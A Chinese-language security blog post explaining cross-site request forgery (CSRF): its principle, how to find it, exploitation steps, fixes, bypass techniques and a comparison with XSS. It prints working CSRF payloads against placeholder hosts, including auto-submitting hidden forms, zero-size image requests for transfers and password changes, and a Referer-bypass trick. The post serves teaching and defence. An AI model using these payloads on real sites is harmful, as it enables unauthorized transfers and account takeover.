---
title: "CSRF 跨站请求伪造"
published: 2026-09-15T22:46:00+08:00
description: "CSRF 的原理、利用步骤与绕过姿势，附与 XSS 的异同对比和修复思路。"
image: ""
tags:
  - 安全笔记
  - Web安全
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

## 一、什么是 CSRF？

**CSRF**（Cross Site Request Forgery，**跨站请求伪造**），属于**前端漏洞**，用于攻击前端用户。

**核心概念：**

> 在受害者**已经登录网站**且**不知情**的情况下，攻击者利用受害者已有的凭证，向服务器发起**预期外的请求**。

| 属性     | 说明                         |
| -------- | ---------------------------- |
| 攻击目标 | 前端用户的**浏览器**         |
| 攻击架构 | B/S 架构（Browser ↔ Server） |
| 漏洞类型 | 前端漏洞                     |

**通俗理解：** 攻击者盗用了你的身份，以你的名义发送恶意请求。

---

## 二、CSRF 的危害

在条件满足的情况下：

**技术层面：**

+ 伪造恶意请求（修改密码、转账、删除数据等）

**社会影响层面：**

+ 电信诈骗
+ 非法更改网站资源
+ 转账
+ 用户增删改查
+ 密码修改
+ 冒用身份进行非法操作

---

## 三、CSRF 漏洞原理

利用浏览器**无法区分**受害者是**主动发起**请求还是**被迷惑发起**请求的固有缺陷，冒用受害者的凭证发起伪造请求。

```plain
正常流程：
  用户登录 → 浏览器保存 Cookie/Session → 用户发起请求 → 服务器验证凭证 → 执行操作

CSRF攻击流程：
  用户登录 → 浏览器保存 Cookie/Session → 用户访问恶意页面 → 恶意页面自动发起请求 → 服务器验证凭证（有效）→ 执行恶意操作
```

> 💡 **关键缺陷**：浏览器在发送请求时会**自动携带 Cookie**，服务器无法判断该请求是用户主动发起的还是恶意伪造的。

---

## 四、如何发现 CSRF？

**核心思路：**

1. 寻找**敏感请求触发点**（修改密码、转账、删除、添加管理员等）
2. 确认请求是否带有 **anti-CSRF token**（防跨站请求伪造令牌）
3. 如果没有 token 或 token 可预测/可绕过，则存在 CSRF 漏洞

**常见敏感操作特征：**

+ 修改密码
+ 修改邮箱/手机号
+ 转账/支付
+ 删除数据
+ 添加管理员
+ 修改个人资料

---

## 五、CSRF 利用思路与步骤

### 5.1 确定利用途径

```plain
1. 识别是通过 GET 请求还是 POST 请求提交
   ├── GET 请求 → 直接构造 URL
   └── POST 请求 → 构造自动提交表单

2. 识别是否有 CSRF Token
   ├── 无 Token → 直接利用
   └── 有 Token → 需要配合 XSS 或 Token 预测
```

| 请求方式 | 利用方法                      |
| -------- | ----------------------------- |
| GET      | 直接构造恶意 URL，诱骗点击    |
| POST     | 构造自动提交的隐藏表单        |
| 有 Token | 需要配合 XSS 窃取或预测 Token |

### 5.2 构造利用方式

**方式1：恶意 URL**

```html
<!-- 让受害者点击这个链接 -->
<a href="http://example.com/transfer?to=attacker&amount=10000">点击领取优惠券</a>

```

**方式2：img 标签（自动加载）**

```html
<!-- 受害者访问页面时自动发起请求 -->
<img src="http://example.com/transfer?to=attacker&amount=10000" width="0" height="0" />
```

**方式3：自动提交的隐藏表单**

```html
<html>
<body onload="document.forms[0].submit();">
    <form action="http://example.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="10000">
    </form>
</body>
</html>

```

**方式4：XMLHttpRequest（配合 XSS）**

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://example.com/transfer', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('to=attacker&amount=10000');
```

**方式5：短网址跳转**

```plain
原恶意链接：http://example.com/transfer?to=attacker&amount=10000
短网址：http://dwz.cn/abc123
```

---

## 六、CSRF 修复思路

| 修复方案                      | 说明                                                  |
| ----------------------------- | ----------------------------------------------------- |
| **1. 敏感操作使用 POST 请求** | 避免使用 GET 请求处理敏感操作（但 POST 不能完全防御） |
| **2. 使用 CSRF Token**        | 生成随机 Token，每次请求时校验                        |
| **3. 验证 Referer**           | 检查请求来源是否合法                                  |
| **4. 增加二次验证**           | 修改密码/转账等操作要求输入密码或短信验证码           |
| **5. 使用预留信息确认**       | 要求用户确认预留信息（如生日、密保问题）              |
| **6. 重要操作使用验证码**     | 使用图形验证码或短信验证码                            |

### CSRF Token 机制

```plain
正常流程：
  1. 服务器生成随机 Token（如：abc123xyz）
  2. Token 保存在 Session 中，并写入表单隐藏字段
  3. 用户提交表单时携带 Token
  4. 服务器校验 Token 是否匹配

CSRF Token 防御原理：
  攻击者无法获取用户 Session 中的 Token → 无法构造包含正确 Token 的请求 → 攻击失败
```

### Referer 验证

```plain
HTTP请求头 Referer：https://example.com/page.html

防御策略：
  1. 校验请求来源是否为目标站点
  2. 如果 Referer 不是本站，则拒绝请求

注意：Referer 可以被伪造或缺失（部分浏览器/网络环境）
```

---

## 七、CSRF 绕过姿势

| 绕过方式              | 原理                                                         |
| --------------------- | ------------------------------------------------------------ |
| **Referer 绕过**      | 构造包含目标站点 host 为路径的链接页面，如 `http://attacker.com/example.com/index.html` |
| **短网址绕过**        | 使用短网址服务隐藏恶意链接                                   |
| **XSS + CSRF 联合**   | 利用 XSS 窃取 CSRF Token，再发起伪造请求                     |
| **空 Referer**        | 部分浏览器或配置下可通过 meta 标签移除 Referer               |
| **HTTPS → HTTP 降级** | 某些情况下可尝试降级请求绕过安全策略                         |

### Referer 绕过示例

```plain
目标站点：example.com
攻击者页面：http://attacker.com/example.com/index.html

某些服务器会检查 Referer 中是否包含 example.com，
attacker.com/example.com/index.html 也包含 example.com，可能被放行。
```

---

## 八、CSRF 和 XSS 的异同

### 相同点

+ 都是**前端漏洞**
+ 都利用用户与网站的交互机制

### 不同点

| 对比项               | XSS                       | CSRF                            |
| -------------------- | ------------------------- | ------------------------------- |
| **核心机制**         | 注入恶意脚本到网页        | 伪造用户请求                    |
| **是否窃取数据**     | ✅ 可窃取 Cookie、敏感数据 | ❌ 不窃取数据，只伪造请求        |
| **是否需要用户登录** | ❌ 不一定                  | ✅ **一般必须**（利用已有凭证）  |
| **依赖 JavaScript**  | ✅ 强依赖（执行恶意脚本）  | ⚠️ 不完全依赖（可仅用 img/表单） |
| **请求方向**         | 双向（可窃取可攻击）      | **单向**（发送伪造请求）        |
| **防御核心**         | 输入过滤、输出编码        | Token、Referer 验证             |

### 关系示意图

```plain
XSS → 可以窃取 CSRF Token → 可以辅助 CSRF 攻击

所以：XSS + CSRF 组合攻击威力更大！
```

---

## 📌 快速参考卡片

### 检测 CSRF 的口诀

```plain
找敏感操作 → 看有无 Token → 无 Token 则 CSRF
```

### 测试 Payload

```html
<!-- GET 请求测试 -->
<img src="http://target.com/change_password?newpwd=123456" />

<!-- POST 请求测试（自动提交） -->
<form action="http://target.com/change_password" method="POST">
    <input name="newpwd" value="123456">
</form>
<script>document.forms[0].submit();</script>
<!-- 测试 Referer 绕过 -->
<a href="http://target.com/change_password?newpwd=123456">点击有惊喜</a>

```

### 防御检查清单

- [ ] 敏感操作是否使用 **POST** 而非 GET？
- [ ] 是否使用 **CSRF Token**？
- [ ] Token 是否足够**随机**且**不可预测**？
- [ ] Token 是否与用户 **Session** 绑定？
- [ ] 是否验证了 **Referer**？
- [ ] 重要操作是否要求**二次验证**（密码/验证码）？
